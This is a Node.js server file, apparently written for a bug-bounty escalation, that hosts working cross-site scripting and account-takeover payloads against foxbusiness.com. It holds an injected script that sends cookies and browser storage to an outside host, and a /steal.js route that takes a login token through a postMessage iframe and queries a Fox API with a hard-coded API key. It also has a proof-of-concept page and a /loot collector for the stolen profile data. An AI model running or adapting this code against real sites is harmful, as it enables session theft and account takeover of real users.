/**
 * XSS payload server - serves JSON with permissive CORS for bug bounty testing.
 * Phase 2: Exfiltration payload for HackerOne escalation (Medium → Critical).
 *
 * Routes:
 *   GET  /         → Serves XSS payload JSON (fetched by _breaking_feed_url)
 *   GET  /exfil    → Receives exfiltrated data via query string (img beacon)
 *   POST /exfil    → Receives exfiltrated data via POST body (fetch)
 *   GET  /loot     → View all captured loot
 *   GET  /alert    → Original alert-only payload (for reference)
 */

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL || `https://xss-cors-payload.onrender.com`;
const LOOT_FILE = path.join(__dirname, 'loot.json');

// Initialize loot storage
let loot = [];
try {
  if (fs.existsSync(LOOT_FILE)) {
    loot = JSON.parse(fs.readFileSync(LOOT_FILE, 'utf8'));
  }
} catch (e) {
  loot = [];
}

function saveLoot(entry) {
  entry.timestamp = new Date().toISOString();
  loot.push(entry);
  try { fs.writeFileSync(LOOT_FILE, JSON.stringify(loot, null, 2)); } catch(e) {}
  console.log('\n========== LOOT CAPTURED ==========');
  console.log(JSON.stringify(entry, null, 2));
  console.log('====================================\n');
}

// ---- XSS Payload ----
// This JS runs in the context of www.foxbusiness.com when the XSS fires.
// It collects document.cookie (includes FOXKITAUTHN with accessToken, refreshToken, idToken),
// all localStorage keys/values, and all sessionStorage keys/values, then exfiltrates via fetch.
const xssScript = `
(function(){
  var e='${BASE_URL}/exfil';
  var d={
    domain:document.domain,
    url:location.href,
    cookie:document.cookie,
    localStorage:{},
    sessionStorage:{}
  };
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d.localStorage[k]=localStorage.getItem(k);}}catch(x){}
  try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);d.sessionStorage[k2]=sessionStorage.getItem(k2);}}catch(x){}
  fetch(e,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d)});
  new Image().src=e+'?c='+encodeURIComponent(document.cookie).slice(0,2000);
})();
`.replace(/\n/g, '').replace(/\s{2,}/g, ' ').trim();

const exfilPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: `BREAKING NEWS <img src=x onerror="${xssScript}">`,
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

// Original alert payload for reference
const alertPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: 'SECURITY TEST <img src=x onerror=alert(document.domain)>',
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  // CORS: allow any origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // ---- /exfil: Receive exfiltrated data ----
  if (pathname === '/exfil') {
    if (req.method === 'GET') {
      // Image beacon — cookie in query string
      const entry = {
        type: 'img-beacon',
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'],
        query: parsed.query
      };
      saveLoot(entry);
      // Return 1x1 transparent GIF
      const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
      res.setHeader('Content-Type', 'image/gif');
      res.writeHead(200);
      res.end(gif);
      return;
    }
    if (req.method === 'POST') {
      // Fetch POST — full data in body
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      req.on('end', () => {
        let parsed_body;
        try { parsed_body = JSON.parse(body); } catch(e) { parsed_body = body; }
        const entry = {
          type: 'fetch-post',
          ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          referer: req.headers['referer'],
          data: parsed_body
        };
        saveLoot(entry);
        res.writeHead(200);
        res.end('ok');
      });
      return;
    }
  }

  // ---- /loot: View captured loot ----
  if (pathname === '/loot') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ---- /alert: Original alert-only payload ----
  if (pathname === '/alert') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(alertPayload, null, 2));
    return;
  }

  // ---- /steal.js: ATO payload (loaded by XSS) ----
  if (pathname === '/steal.js') {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache');
    res.writeHead(200);
    res.end(`
(async function(){
  try {
    var SERVER = '${BASE_URL}';
    var tokenData = await new Promise(function(ok, fail) {
      var t = setTimeout(function(){ fail('timeout') }, 10000);
      window.addEventListener('message', function h(e) {
        if (e.origin !== 'https://my.foxbusiness.com') return;
        try {
          var d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
          if (d.name === 'silentLogin' && d.data && d.data.token) {
            clearTimeout(t); window.removeEventListener('message', h); ok(d.data);
          }
        } catch(x) {}
      });
      var f = document.getElementById('xdchannel');
      if (!f) {
        f = document.createElement('iframe'); f.id = 'xdchannel';
        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
        f.style.display = 'none';
        (document.body || document.documentElement).appendChild(f);
        f.onload = function() {
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        };
      } else {
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
      }
    });
    var tk = tokenData.token;
    alert('STOLEN ACCESS TOKEN:\\n\\n' + tk);
    var parts = tk.split('.');
    var jwtPayload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
    var profileId = jwtPayload.uid;
    var r = await fetch('https://api3.fox.com/v2.0/update/' + profileId, {
      headers: { 'Authorization': 'Bearer ' + tk, 'x-api-key': '4DfS6SQQBOoc2xImxylIam2ri8TXdHQV' }
    });
    var profile = await r.json();
    await fetch(SERVER + '/exfil', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token:tk, profileId:profile.profileId, email:profile.email, displayName:profile.displayName, firstName:profile.firstName, viewerId:profile.viewerId, ipAddress:profile.ipAddress, domain:document.domain })
    });
    document.title = 'ATO: ' + profile.email;
    var b = document.createElement('div');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
    b.textContent = 'Account Takeover - Stolen: ' + profile.email;
    (document.body || document.documentElement).prepend(b);
  } catch(e) { new Image().src = '${BASE_URL}/exfil?err=' + encodeURIComponent(String(e)); }
})();
`);
    return;
  }

  // ---- /poc: ATO PoC page ----
  if (pathname === '/poc') {
    res.setHeader('Content-Type', 'text/html');
    res.writeHead(200);
    res.end(`<!DOCTYPE html>
<html><head><title>foxbusiness.com PostMessage XSS to ATO</title>
<style>body{font-family:system-ui;max-width:600px;margin:2rem auto;padding:0 1rem}button{padding:.6rem 1.2rem;font-size:1rem;cursor:pointer;background:#d32f2f;color:#fff;border:none;border-radius:4px}</style></head>
<body>
<h1>foxbusiness.com PostMessage XSS &rarr; Account Takeover</h1>
<p>Prerequisite: Victim must be logged into Fox Business.</p>
<button onclick="launchATO()">Launch Account Takeover</button>
<p id="status"></p>
<p>After clicking: check <a href="/loot" target="_blank">/loot</a> for stolen data.</p>
<script>
function msg(n,d){return{type:'fnnBrokerResponse',name:n,origin:'https://www.foxbusiness.com',data:d}}
function ato(){return{authenticated:true,userInfo:{'https://foxnews.com/picture':'" onerror="var s=document.createElement(\\'script\\');s.src=\\'${BASE_URL}/steal.js\\';(document.body||document.documentElement).appendChild(s)" x="','https://foxnews.com/name':'ATO','https://foxnews.com/email':'ato@poc.com','https://foxnews.com/uuid':'x'},token:'x',anon:{segment:{lastKnownProfileId:'a',lastAnonymousProfileId:'a',dcg_profile_id:'a'},value:'a'}}}
function send(w){var t='https://www.foxbusiness.com';w.postMessage(msg('ready',null),t);w.postMessage(msg('hasPendingPasswordless',false),t);w.postMessage(msg('silentLogin',ato()),t)}
function launchATO(){var w=window.open('https://www.foxbusiness.com/','_blank');if(!w){alert('Allow popups');return}var f=setInterval(function(){try{send(w)}catch(e){}},10);setTimeout(function(){clearInterval(f);f=setInterval(function(){try{send(w)}catch(e){}},50)},2000);setTimeout(function(){clearInterval(f)},15000);document.getElementById('status').innerHTML='Flooding... check <a href="/loot" target="_blank">/loot</a> in ~5s.'}
</script></body></html>`);
    return;
  }

  // ---- /poc-alert: Original alert-only PoC ----
  if (pathname === '/poc-alert') {
    res.setHeader('Content-Type', 'text/html');
    res.writeHead(200);
    res.end(`<!DOCTYPE html>
<html><head><title>foxbusiness.com PostMessage XSS (alert)</title></head><body>
<h1>foxbusiness.com PostMessage XSS</h1>
<button onclick="go()">Launch XSS (alert)</button>
<script>
function msg(n,d){return{type:'fnnBrokerResponse',name:n,origin:'https://www.foxbusiness.com',data:d}}
function xss(){return{authenticated:true,userInfo:{'https://foxnews.com/picture':'" onerror="alert(document.domain)" x="','https://foxnews.com/name':'XSS','https://foxnews.com/email':'x@x.com','https://foxnews.com/uuid':'x'},token:'x',anon:{segment:{lastKnownProfileId:'a',lastAnonymousProfileId:'a',dcg_profile_id:'a'},value:'a'}}}
function send(w){var t='https://www.foxbusiness.com';w.postMessage(msg('ready',null),t);w.postMessage(msg('hasPendingPasswordless',false),t);w.postMessage(msg('silentLogin',xss()),t)}
function go(){var w=window.open('https://www.foxbusiness.com/','_blank');if(!w){alert('Allow popups');return}var f=setInterval(function(){try{send(w)}catch(e){}},10);setTimeout(function(){clearInterval(f);f=setInterval(function(){try{send(w)}catch(e){}},50)},2000);setTimeout(function(){clearInterval(f)},15000)}
</script></body></html>`);
    return;
  }

  // ---- /foxbusiness-postmessage-poc.html: Original PoC (static file compat) ----
  if (pathname === '/foxbusiness-postmessage-poc.html') {
    res.setHeader('Content-Type', 'text/html');
    res.writeHead(200);
    res.end(`<!DOCTYPE html>
<html><head><title>foxbusiness.com PostMessage XSS</title></head><body>
<h1>foxbusiness.com PostMessage XSS</h1>
<button onclick="launchAttack()">Launch XSS</button>
<script>
var targetWin,flood;
function msg(n,d){return{type:'fnnBrokerResponse',name:n,origin:'https://www.foxbusiness.com',data:d}}
function xssPayload(){return{authenticated:true,userInfo:{'https://foxnews.com/picture':'" onerror="alert(document.domain)" x="','https://foxnews.com/name':'XSS','https://foxnews.com/email':'xss@poc.com','https://foxnews.com/uuid':'poc-uuid'},token:'x',anon:{segment:{lastKnownProfileId:'a',lastAnonymousProfileId:'a',dcg_profile_id:'a'},value:'a'}}}
function send(win){var t='https://www.foxbusiness.com';win.postMessage(msg('ready',null),t);win.postMessage(msg('hasPendingPasswordless',false),t);win.postMessage(msg('silentLogin',xssPayload()),t)}
function launchAttack(){targetWin=window.open('https://www.foxbusiness.com/','_blank');if(!targetWin){alert('Allow popups');return}flood=setInterval(function(){try{send(targetWin)}catch(e){}},10);setTimeout(function(){clearInterval(flood);flood=setInterval(function(){try{send(targetWin)}catch(e){}},50)},2000);setTimeout(function(){clearInterval(flood)},15000)}
</script></body></html>`);
    return;
  }

  // ---- / (root): Exfiltration payload ----
  res.setHeader('Content-Type', 'application/json');
  res.writeHead(200);
  res.end(JSON.stringify(exfilPayload, null, 2));
});

server.listen(PORT, () => {
  console.log(`XSS payload server on http://localhost:${PORT}`);
  console.log(`Routes:`);
  console.log(`  GET  /       → Exfiltration XSS payload`);
  console.log(`  GET  /exfil  → Receive exfil (img beacon)`);
  console.log(`  POST /exfil  → Receive exfil (fetch POST)`);
  console.log(`  GET  /loot   → View all captured loot`);
  console.log(`  GET  /alert  → Original alert payload`);
  console.log(`\nTrigger URL:`);
  console.log(`  https://www.foxbusiness.com/?_breaking_feed_url=${BASE_URL}/`);
});
